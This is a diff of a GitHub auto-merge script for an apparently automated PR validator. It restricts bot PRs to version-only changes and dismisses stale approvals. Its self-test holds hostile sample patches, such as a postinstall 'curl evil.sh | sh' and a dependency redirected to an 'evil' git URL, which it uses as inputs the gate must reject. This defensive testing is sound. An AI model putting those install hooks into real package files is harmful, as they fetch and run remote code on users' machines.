@@ -8,13 +8,17 @@
 //   - the verdict is on the head commit, the PR is open and not a draft
 //   - the PR is not the user's own (GitHub does not let anyone approve their own)
 //   - it comes from a branch of the repo itself, never a fork, and its author may already write to
-//     the repo, or is an app that only touches upkeep files (Dependabot, Renovate). A coding agent
-//     does not pass: it writes code from instructions anyone may have left it. A verdict reads the
-//     PR's own text, so it can be talked into passing; this script decides on facts the PR cannot write
+//     the repo, or is an app that only moves versions (Dependabot, Renovate): lock files, or a
+//     package.json whose diff changes nothing but versions. A coding agent does not pass: it writes
+//     code from instructions anyone may have left it. Nor does a Dockerfile, a workflow or a script:
+//     they run on install, build or CI. A verdict reads the PR's own text, so it can be talked into
+//     passing; this script decides on facts the PR cannot write
 //   - no conflicts, and every CI check passed (no checks at all is not green)
 //   - after the approval, GitHub says it can merge (required reviews and rules satisfied)
 // Merge uses the first method the repo allows (squash, merge commit, rebase), pinned to the head
-// commit, so a push in between makes the merge fail instead of merging unvalidated code.
+// commit, so a push in between makes the merge fail instead of merging unvalidated code. An approval
+// of Argos that a push outdated is dismissed: not every repo does that by itself, and it would
+// stand for code nobody validated.
 //
 // Usage:
 //   node merge.mjs sweep          every passing verdict in an opted-in repo with no outcome yet
@@ -22,7 +26,7 @@
 // Each outcome lands on the verdict (merge: { state: merged | approved | skipped, why, sha, at }).
 // A commit is looked at again each round until its outcome stands: CI still running, more reviews
 // needed or a network error may change; a fork or a merged PR will not. It is approved only once.
-// A PR left to humans (verdicts.mjs human) is never touched. Env: ARGOS_STATE, as the other scripts.
+// A PR left to humans (verdicts.mjs human) is never approved or merged. Env: ARGOS_STATE, as the other scripts.
 import { execFileSync } from "node:child_process";
 import { closeSync, existsSync, mkdirSync, openSync, rmSync, statSync } from "node:fs";
 import { homedir } from "node:os";
@@ -30,15 +34,21 @@ import { dirname, join } from "node:path";
 import assert from "node:assert/strict";
 import { pathToFileURL } from "node:url";
 import { read as readRepos } from "./repos.mjs";
-import { onlyUpkeep } from "./upkeep.mjs";
-import { read, withLock, write } from "./verdicts.mjs";
+import { onlyUpkeep, pinsOnly } from "./upkeep.mjs";
+import { nap, read, withLock, write } from "./verdicts.mjs";
 
 const repoOf = (url) => url.match(/github\.com\/([^/]+\/[^/]+)\/pull\//)?.[1] ?? "";
 const sameSha = (a = "", b = "") => Boolean(a && b) && (a.startsWith(b) || b.startsWith(a));
 const GREEN = new Set(["SUCCESS", "NEUTRAL", "SKIPPED"]);
 const WRITERS = new Set(["admin", "write"]);
 // Skips that no later round can change, for this commit.
-const FINAL = new Set(["not open", "your PR", "from a fork", "author cannot write", "coding agent"]);
+const FINAL = new Set(["not open", "your PR", "from a fork", "author cannot write", "coding agent", "changes build or CI"]);
+const REVIEW_BODY = "Argos: validated with no blockers and nothing needing attention.";
+// Said on the PR's line until the dismissal goes through; view.ts shows it over "new commits".
+const OLD_APPROVAL = "stale approval: dismiss it on GitHub";
+// Past this a sweep stops and the next round goes on: the mod kills it at 120 s, and one PR may take
+// tens of seconds more.
+const SWEEP_MS = 60_000;
 const running = (c) => c.state === "PENDING" || c.state === "EXPECTED" || (Boolean(c.status) && c.status !== "COMPLETED");
 
 // A passing verdict: the only ones this script looks at; the rest show their own verdict.
@@ -53,7 +63,9 @@ export function gate(pr, verdict, me, access) {
   if (me && pr.author?.login?.toLowerCase() === me.toLowerCase()) return "your PR";
   if (pr.isCrossRepository !== false) return "from a fork";
   if (pr.author?.is_bot) {
-    if (!onlyUpkeep((pr.files ?? []).map((f) => f.path))) return "coding agent";
+    const files = pr.files ?? [];
+    if (!onlyUpkeep(files.map((f) => f.path))) return "coding agent";
+    if (!files.every(pinsOnly)) return "changes build or CI";
   } else if (!WRITERS.has(access)) return access ? "author cannot write" : "author access unknown";
   if (pr.mergeable !== "MERGEABLE") return pr.mergeable === "CONFLICTING" ? "conflicts" : "mergeability unknown";
   const checks = pr.statusCheckRollup ?? [];
@@ -67,6 +79,26 @@ export const settled = (verdict) => {
   const m = verdict.merge;
   return m?.sha === verdict.sha && (m.state === "merged" || FINAL.has(m.why));
 };
+
+// Argos's own approvals, from `pulls/<n>/reviews`. The person shares the account: the body tells
+// theirs apart, and theirs stays.
+export const ownApprovals = (reviews, me) => reviews.filter((r) => r.state === "APPROVED" && r.user?.login?.toLowerCase() === me.toLowerCase() && Boolean(r.body?.startsWith("Argos:")));
+
+// Why GitHub would not merge an approved PR, from its mergeStateStatus.
+const blockedBy = (status) => ({ BEHIND: "behind base: update the branch on GitHub", UNKNOWN: "mergeability unknown", DIRTY: "conflicts" })[status] ?? "needs more reviews";
+
+// GitHub works mergeability out on demand, and each merge starts it over for the repo's other PRs.
+const whenKnown = (ask, field) => {
+  let answer = ask();
+  for (let tries = 0; tries < 4 && answer[field] === "UNKNOWN"; tries++) {
+    nap(2000);
+    answer = ask();
+  }
+  return answer;
+};
+const lines = (out) => out.split("\n").filter(Boolean).map((l) => JSON.parse(l));
+const pullPath = (url) => `repos/${repoOf(url)}/pulls/${url.split("/").at(-1)}`;
+const reviewsOf = (run, url) => lines(run(["api", "--paginate", `${pullPath(url)}/reviews`, "-q", ".[] | {id, state, body, commit_id, user: {login: .user.login}}"]));
 
 // The repo's first allowed method, as a gh pr merge flag.
 export const method = (r) => (r.allow_squash_merge ? "--squash" : r.allow_merge_commit ? "--merge" : r.allow_rebase_merge ? "--rebase" : null);
@@ -88,31 +120,88 @@ function sweep() {
   }
 }
 
+// As the account this repo is connected with.
+const asAccount = (repos, url) => {
+  const account = repos.find((r) => r.repo.toLowerCase() === repoOf(url).toLowerCase())?.account;
+  const env = account ? { ...process.env, GH_TOKEN: gh(["auth", "token", "-u", account]) } : process.env;
+  return (args) => gh(args, env);
+};
+
+// Takes back what a push outdated or a newer verdict on the same commit refuted, also where auto-merge
+// went off since. Returns the PRs it could not: they wait, each saying so, and the next round tries again.
+function retract(repos, until) {
+  const stuck = new Set();
+  for (const [url, sha] of Object.entries(read().approved)) {
+    if (Date.now() > until) break;
+    try {
+      const run = asAccount(repos, url);
+      const pr = JSON.parse(run(["pr", "view", url, "--json", "state,headRefOid"]));
+      const verdict = read().prs[url];
+      const refuted = verdict?.state === "done" && sameSha(verdict.sha, sha) && !passes(verdict);
+      if (pr.state === "OPEN" && sameSha(pr.headRefOid, sha) && !refuted) continue;
+      if (pr.state === "OPEN")
+        for (const r of ownApprovals(reviewsOf(run, url), run(["api", "user", "-q", ".login"])))
+          if (refuted || r.commit_id !== pr.headRefOid)
+            run(["api", "-X", "PUT", `${pullPath(url)}/reviews/${r.id}/dismissals`, "-f", `message=Argos: ${refuted ? "a newer validation did not pass" : "new commits since this approval"}.`]);
+      withLock(() => {
+        const now = read();
+        const { [url]: _, ...approved } = now.approved;
+        const prs = { ...now.prs };
+        if (prs[url]?.merge?.why === OLD_APPROVAL) {
+          const { merge: __, ...rest } = prs[url];
+          prs[url] = rest;
+        }
+        write({ ...now, approved, prs });
+      });
+    } catch {
+      stuck.add(url);
+      withLock(() => {
+        const now = read();
+        if (now.prs[url]) write({ ...now, prs: { ...now.prs, [url]: { ...now.prs[url], merge: { state: "skipped", why: OLD_APPROVAL, sha: now.prs[url].sha, at: new Date().toISOString() } } } });
+      });
+    }
+  }
+  return stuck;
+}
+
 function sweepAll() {
-  const repos = readRepos().filter((r) => r.merge);
+  const all = readRepos();
+  const until = Date.now() + SWEEP_MS;
+  const stuck = retract(all, until);
+  const repos = all.filter((r) => r.merge);
   if (!repos.length) return [];
   const v = read();
   const done = [];
   for (const [url, verdict] of Object.entries(v.prs)) {
+    if (Date.now() > until) break;
     const cfg = repos.find((r) => r.repo.toLowerCase() === repoOf(url).toLowerCase());
-    if (!cfg || !passes(verdict) || settled(verdict) || v.human?.includes(url)) continue;
+    if (!cfg || !passes(verdict) || settled(verdict) || v.human?.includes(url) || stuck.has(url)) continue;
     let approved = verdict.merge?.sha === verdict.sha && verdict.merge.state === "approved";
     let outcome;
     try {
-      const env = cfg.account ? { ...process.env, GH_TOKEN: gh(["auth", "token", "-u", cfg.account]) } : process.env;
-      const run = (args) => gh(args, env);
-      const pr = JSON.parse(run(["pr", "view", url, "--json", "state,isDraft,headRefOid,author,isCrossRepository,files,mergeable,statusCheckRollup"]));
-      const why = gate(pr, verdict, run(["api", "user", "-q", ".login"]), pr.author?.is_bot ? undefined : accessOf(run, repoOf(url), pr.author?.login));
-      // approved stays on the record, so no later round approves again
-      if (why) outcome = { state: approved ? "approved" : "skipped", why };
+      const run = asAccount(repos, url);
+      const pr = whenKnown(() => JSON.parse(run(["pr", "view", url, "--json", "state,isDraft,headRefOid,author,isCrossRepository,mergeable,statusCheckRollup"])), "mergeable");
+      if (pr.author?.is_bot) pr.files = lines(run(["api", "--paginate", `${pullPath(url)}/files`, "-q", ".[] | {path: .filename, patch}"]));
+      const me = run(["api", "user", "-q", ".login"]);
+      const why = gate(pr, verdict, me, pr.author?.is_bot ? undefined : accessOf(run, repoOf(url), pr.author?.login));
+      // approved stays on the record, so no later round approves again; new commits took it back
+      if (why) outcome = { state: approved && why !== "new commits" ? "approved" : "skipped", why };
       else {
+        // GitHub knows what the record may have lost: a kill, or a validation run again on this commit
+        approved ||= ownApprovals(reviewsOf(run, url), me).some((r) => r.commit_id === pr.headRefOid);
         if (!approved) {
-          run(["pr", "review", url, "--approve", "--body", "Argos: validated with no blockers and nothing needing attention."]);
+          // noted first: a note with no approval is harmless, an approval with no note never goes away
+          withLock(() => {
+            const now = read();
+            write({ ...now, approved: { ...now.approved, [url]: pr.headRefOid } });
+          });
+          // on the commit the verdict is for: gh pr review would take whatever the head is by now
+          run(["api", "-X", "POST", `${pullPath(url)}/reviews`, "-f", "event=APPROVE", "-f", `commit_id=${pr.headRefOid}`, "-f", `body=${REVIEW_BODY}`]);
           approved = true;
         }
-        const after = JSON.parse(run(["pr", "view", url, "--json", "mergeStateStatus"]));
+        const after = whenKnown(() => JSON.parse(run(["pr", "view", url, "--json", "mergeStateStatus"])), "mergeStateStatus");
         const how = method(JSON.parse(run(["api", `repos/${repoOf(url)}`])));
-        if (after.mergeStateStatus !== "CLEAN" || !how) outcome = { state: "approved", why: how ? "needs more reviews" : "no merge method allowed" };
+        if (after.mergeStateStatus !== "CLEAN" || !how) outcome = { state: "approved", why: how ? blockedBy(after.mergeStateStatus) : "no merge method allowed" };
         else {
           run(["pr", "merge", url, how, "--match-head-commit", pr.headRefOid]);
           outcome = { state: "merged", why: how.slice(2) };
@@ -142,7 +231,7 @@ function accessOf(run, repo, login) {
 }
 
 function gh(args, env = process.env) {
-  return execFileSync("gh", args, { encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
+  return execFileSync("gh", args, { encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"], timeout: 20_000 }).trim();
 }
 
 function selfTest() {
@@ -176,17 +265,49 @@ function selfTest() {
   assert.equal(settled(merge("merged", "squash", "other00")), false);
   assert.equal(settled(merge("approved", "from a fork")), true);
   // who opened it: a fork never, even with write access; a person needs write access; no answer
-  // counts against; an app passes only when it touches nothing but upkeep files
+  // counts against; an app passes only when it does nothing but move versions
   assert.equal(gate({ ...ok, isCrossRepository: true }, v, "me", "write"), "from a fork");
   assert.equal(gate({ ...ok, isCrossRepository: undefined }, v, "me", "write"), "from a fork");
   assert.equal(gate(ok, v, "me", "read"), "author cannot write");
   assert.equal(gate(ok, v, "me", "none"), "author cannot write");
   assert.equal(gate(ok, v, "me"), "author access unknown");
-  const bump = [{ path: "package.json" }, { path: "web/package-lock.json" }];
+  const pin = (name, from, to) => `@@ -1,3 +1,3 @@\n {\n-  "${name}": "${from}",\n+  "${name}": "${to}",\n }`;
+  const bump = [{ path: "package.json", patch: pin("lodash", "^4.17.20", "^4.17.21") }, { path: "web/package-lock.json" }];
   assert.equal(gate({ ...ok, author: { login: "app/dependabot", is_bot: true }, files: bump }, v, "me"), null);
   assert.equal(gate({ ...ok, author: { login: "app/copilot-swe-agent", is_bot: true }, files: [...bump, { path: "src/pay.ts" }] }, v, "me"), "coding agent");
   assert.equal(gate({ ...ok, author: { login: "app/dependabot", is_bot: true } }, v, "me"), "coding agent");
   assert.equal(gate({ ...ok, author: { login: "app/evil", is_bot: true }, files: bump, isCrossRepository: true }, v, "me"), "from a fork");
+  // upkeep by name, yet it runs on install, build or CI: a script, a new or redirected package, an
+  // image, a workflow, a manifest that is code, a diff GitHub left out
+  const bot = (files) => gate({ ...ok, author: { login: "app/dependabot", is_bot: true }, files }, v, "me");
+  for (const patch of [
+    pin("postinstall", "node x.js", "curl evil.sh | sh"),
+    '@@ -1 +1,2 @@\n+  "postinstall": "curl evil.sh | sh",',
+    pin("postinstall", "1.0.0", "1.0.0 && curl evil.sh"),
+    pin("lodash", "4.17.20", "git+https://evil/lodash"),
+    '@@ -1 +1,2 @@\n+  "evil": "1.0.0",',
+    '@@ -1 +1 @@\n-  "lodash": "4.17.20",\n+  "evil": "1.0.0",',
+    undefined,
+    null,
+  ])
+    assert.equal(bot([{ path: "package.json", patch }]), "changes build or CI", patch);
+  for (const path of ["Dockerfile", "svc/Dockerfile", ".github/workflows/ci.yml", "Gemfile", "pom.xml", "build.gradle", "pyproject.toml", "Cargo.toml", "app.csproj"])
+    assert.equal(bot([{ path }]), "changes build or CI", path);
+  assert.equal(bot([{ path: "yarn.lock" }, { path: "go.sum" }]), null);
+  assert.equal(bot([{ path: "requirements.txt" }]), "changes build or CI");
+  assert.equal(bot([{ path: "go.mod" }, { path: "go.sum" }]), "changes build or CI");
+  assert.equal(bot([{ path: "package.json", patch: `${pin("a", "1.0.0", "1.0.1")}\r\n\\ No newline at end of file` }]), null);
+  assert.equal(settled(merge("skipped", "changes build or CI")), true);
+  // only Argos's own approvals: not the person's
+  const review = (o) => ({ state: "APPROVED", user: { login: "Me" }, commit_id: "old", body: REVIEW_BODY, ...o });
+  assert.deepEqual(ownApprovals([review({ id: 1 })], "me").map((r) => r.id), [1]);
+  assert.deepEqual(ownApprovals([review({ body: "LGTM" }), review({ body: null }), review({ user: { login: "bia" } }), review({ state: "DISMISSED" })], "me"), []);
+  assert.equal(blockedBy("BEHIND"), "behind base: update the branch on GitHub");
+  assert.equal(blockedBy("BLOCKED"), "needs more reviews");
+  // still working it out: asks again; never past the limit
+  let asked = 0;
+  const known = whenKnown(() => ({ mergeable: asked++ ? "MERGEABLE" : "UNKNOWN" }), "mergeable");
+  assert.deepEqual([known.mergeable, asked], ["MERGEABLE", 2]);
   assert.equal(method({ allow_squash_merge: false, allow_merge_commit: true }), "--merge");
   assert.equal(method({}), null);
   console.log("self-test ok");
